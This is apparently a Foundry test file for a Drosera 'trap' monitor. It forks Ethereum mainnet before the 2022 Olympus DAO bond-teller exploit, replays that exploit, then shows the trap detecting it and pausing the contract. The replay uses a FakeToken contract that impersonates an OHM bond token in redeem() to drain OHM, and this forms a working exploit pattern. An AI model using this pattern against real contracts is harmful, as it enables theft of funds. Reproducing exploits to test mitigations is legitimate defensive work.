// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {BondFixedExpiryTellerWithDrosera} from "../src/BondFixedExpiryTellerWithDrosera.sol";
import {ERC20BondToken} from "../src/ERC20BondToken.sol";
import "../src/OlympusDaoTrap.sol";

interface IDroseraTrap {
    function collect() external view returns (uint256[] memory);

    function isValid(
        uint256[][] calldata dataPoints
    ) external view returns (bool);
}

address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

contract FakeToken {
    function underlying() external view returns (address) {
        return OHM;
    }

    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address, uint256) external {
        // no thing
    }
}

/// @title Olympus Dao Trap Test
/// @notice Purpose: Test the mitigation of Olympus Dao's exploit
/// @dev forge test -vv
// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)
// Attacker : 0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be
// AttackContract : 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f
// Tx1 attack redeem:  https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
// @NewsTrack
// PeckShield : https://twitter.com/peckshield/status/1583416829237526528
contract OlympusDaoTrapTest is Test {
    /* ========== STATE VARIABLES ========== */
    bytes32 public trapHash;
    IDroseraTrap trapContract;
    address constant BFETAddress = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
    string public protocolByteCodePath =
        "BondFixedExpiryTellerWithDrosera.sol:BondFixedExpiryTellerWithDrosera";
    string public trapByteCodePath = "OlympusDaoTrap.sol:OlympusDaoTrap";

    function setUp() public {
        // Fork from block before exploit occured on mainnet
        vm.createSelectFork("mainnet", 15794363);
        vm.label(OHM, "OHM");
        vm.label(BFETAddress, "BFETAddress");

        // Update code of olympus contract address
        bytes memory code = vm.getDeployedCode(protocolByteCodePath);
        vm.etch(BFETAddress, code);

        // Deploy the Trap contract
        bytes memory args = abi.encode(OHM, BFETAddress);
        bytes memory byteCode = abi.encodePacked(
            vm.getCode(trapByteCodePath),
            args
        );
        address deployed;
        assembly {
            deployed := create(0, add(byteCode, 0x20), mload(byteCode))
        }
        trapContract = IDroseraTrap(deployed);
    }

    function testExploit() public {
        console.log("---------- Start from Block %s ----------", block.number);

        // Starting Block
        uint256 startingBlock = block.number;

        // First Collect
        console.log("DROSERA Collected Data From Block %s", block.number);
        uint256[] memory initialCollectedData = trapContract.collect();
        require(initialCollectedData.length > 0, "Collected data is empty");

        emit log_named_decimal_uint(
            "Bond Contract OHM Balance",
            IERC20(OHM).balanceOf(
                address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156)
            ),
            9
        );
        emit log_named_decimal_uint(
            "Attacker OHM Balance",
            IERC20(OHM).balanceOf(address(this)),
            9
        );

        // Move the VM up 10 blocks
        uint256 numOfBlocks = 10;
        vm.roll(numOfBlocks + block.number);
        skip(numOfBlocks * 12);
        uint256 endingBlock = block.number;
        console.log("---------- Warp to Block %s ----------", block.number);

        address fakeToken = address(new FakeToken());
        vm.label(fakeToken, "FakeToken");

        uint256 totalAmount = 30437077948152;
        console.log("Attacker performs exploit");
        BondFixedExpiryTellerWithDrosera(BFETAddress).redeem(
            ERC20BondToken(fakeToken),
            totalAmount / 2
        );

        emit log_named_decimal_uint(
            "Bond Contract OHM Balance after first hack",
            IERC20(OHM).balanceOf(
                address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156)
            ),
            9
        );
        emit log_named_decimal_uint(
            "Attacker OHM Balance after first hack",
            IERC20(OHM).balanceOf(address(this)),
            9
        );

        // Second Collect
        console.log("DROSERA Collected Data From Block %s", block.number);
        uint256[] memory finalCollectedData = trapContract.collect();
        require(finalCollectedData.length > 0, "Collected data is empty");

        // Check the trap
        console.log(
            "DROSERA performs trap logic on %s and %s",
            startingBlock,
            endingBlock
        );
        uint256[][] memory dataPoints = new uint[][](2);
        dataPoints[0] = finalCollectedData;
        dataPoints[1] = initialCollectedData;
        bool result = trapContract.isValid(dataPoints);
        require(result == false, "Trap should be invalid");
        console.log(
            "DROSERA identified that state is invalid and emergency response is required"
        );

        // Pre-Check
        require(
            BondFixedExpiryTellerWithDrosera(BFETAddress).isPaused() == false
        );

        /* ---- DROSERA SUBMITS CLAIM ---- */
        BondFixedExpiryTellerWithDrosera(BFETAddress).emergencyPause();

        // Post-Check
        require(
            BondFixedExpiryTellerWithDrosera(BFETAddress).isPaused() == true
        );

        // Move the VM up 1 blocks
        numOfBlocks = 1;
        vm.roll(numOfBlocks + block.number);
        skip(numOfBlocks * 12);
        console.log("---------- Mine Next Block %s ----------", block.number);

        // Prove Attacker Mitigation
        console.log("Attacker attempts to perform exploit again");
        vm.expectRevert("BondFixedExpiryTeller: contract is paused");
        BondFixedExpiryTellerWithDrosera(BFETAddress).redeem(
            ERC20BondToken(fakeToken),
            totalAmount / 2
        );
        console.log(
            "Attacker transaction reverts with BondFixedExpiryTeller: contract is paused"
        );
        emit log_named_decimal_uint(
            "Bond Contract OHM Balance after second hack attempt",
            IERC20(OHM).balanceOf(
                address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156)
            ),
            9
        );
        emit log_named_decimal_uint(
            "Attacker OHM Balance after second hack attempt",
            IERC20(OHM).balanceOf(address(this)),
            9
        );
        console.log("Attack mitigated successfully");
    }
}
